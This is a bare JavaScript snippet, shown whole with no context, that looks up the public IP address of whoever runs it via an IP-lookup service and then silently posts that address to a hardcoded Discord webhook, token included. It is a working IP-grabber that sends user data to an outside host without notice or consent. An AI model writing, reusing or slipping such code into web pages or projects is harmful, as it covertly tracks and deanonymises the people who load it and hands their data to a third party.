fetch('https://api.ipify.org')
  .then(response => response.text())
  .then(ip => {
    fetch('https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: ip })
    });
  })
